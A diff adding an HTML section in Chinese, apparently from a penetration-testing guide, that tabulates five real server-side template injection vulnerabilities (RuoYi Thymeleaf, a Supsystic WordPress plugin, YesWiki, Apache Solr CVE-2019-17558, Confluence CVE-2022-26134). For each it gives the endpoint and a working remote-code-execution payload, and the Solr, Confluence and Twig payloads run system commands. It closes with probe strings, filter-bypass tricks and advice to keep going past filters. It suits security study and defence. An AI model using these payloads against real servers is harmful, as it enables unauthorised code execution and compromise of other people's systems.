@@ -1,0 +1,41 @@
+<p>下表 5 个案例均来自公开披露的真实漏洞，接口路径与参数保持原始写法，可对照自己遇到的功能点做同类比照。</p>
+<table class="case-table">
+<thead>
+<tr><th>位置（接口 / 参数）</th><th>漏洞成因</th><th>关键载荷</th></tr>
+</thead>
+<tbody>
+<tr>
+<td>若依 RuoYi v4.8.1 <code>POST /monitor/cache/getNames</code>，<code>fragment</code> 参数（需 <code>monitor:cache:view</code> 权限）</td>
+<td>控制器把参数直接拼进视图名（<code>return prefix + "/cache::" + fragment</code>），Thymeleaf 把片段引用当表达式求值，参数与表达式之间没有任何白名单</td>
+<td>探测：<code>fragment=__${7*7}__</code>，回显 49 即存在。<br>thymeleaf 3.0.15 起拦截 <code>${</code>，改用 <code>__|$${...}|__::.x</code> 变形绕过；RCE 时用字符串拼接 + 反射加载 SpEL 解析器：<code>''.getClass().forName('org.'%2b'springframework...SpelExpressionParser')</code></td>
+</tr>
+<tr>
+<td>WordPress 插件 Contact Form by Supsystic &le; 1.7.36，任意挂载该表单的页面 <code>GET /?cfsPreFill[字段名]=</code></td>
+<td>表单预填值被直接送进未沙箱的 Twig 渲染环境，且 <code>registerUndefinedFilterCallback</code> 未被禁用，PHP 函数仍可注册成 filter 回调</td>
+<td><code>{{registerUndefinedFilterCallback('system')|filter('id')}}</code></td>
+</tr>
+<tr>
+<td>YesWiki &lt; 4.6.6（Bazar 模块），表单定义字段 <code>bn_sem_template</code> 写入，触发 <code>GET /?api/forms/{id}/entries/json-ld</code></td>
+<td>语义模板内容由用户写入数据库，公开语义接口渲染时按 Twig 表达式求值；写入与渲染两侧都没有过滤</td>
+<td>存储型确认：<code>{"proof":"{{7*7}}"}</code>，公开接口回显 <code>"49"</code>；RCE 版换成调用 PHP 函数的 Twig 表达式</td>
+</tr>
+<tr>
+<td>Apache Solr 5.0.0&ndash;8.3.1（CVE-2019-17558），先 <code>POST /solr/demo/config</code> 打开 <code>params.resource.loader.enabled</code>，再 <code>GET /solr/demo/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=</code></td>
+<td>参数模板加载开关可经配置 API 打开，<code>wt=velocity</code> 时请求参数被当作 Velocity 模板交给引擎渲染</td>
+<td><code>#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</code></td>
+</tr>
+<tr>
+<td>Atlassian Confluence Server / Data Center 1.3.0&ndash;7.18.0（CVE-2022-26134），表达式放在 URI 路径：<code>GET /%24%7B...%7D/</code></td>
+<td>URL 路径在进入 Action 映射前就被 XWork 当成 OGNL 表达式解析，路径内容未做转义</td>
+<td><code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}</code></td>
+</tr>
+</tbody>
+</table>
+
+<h4>共性规律</h4>
+<ul>
+<li>入口集中在「用户可编辑的模板 / 视图名 / 表达式」：通知模板、邮件短信模板、报表自定义字段、CMS 主题、低代码公式、缓存片段名。</li>
+<li>探测只发算术即可：<code>{{7*7}}</code>、<code>${7*7}</code>、<code>#{7*7}</code>、<code>&lt;%= 7*7 %&gt;</code>、<code>${{7*7}}</code>，看是否返回 <code>49</code> 而不是原样文本。</li>
+<li>黑名单永远滞后：官方升级后会先有语法变形（<code>__|$${}|__::.x</code>、<code>'org.'+'springframework'</code> 拼接、<code>forName</code> 反射），看到"已加过滤"不要直接放弃。</li>
+<li>模板引擎本就持有应用内部对象，一旦可控即按 RCE 定级，不能当 XSS 处理。</li>
+</ul>
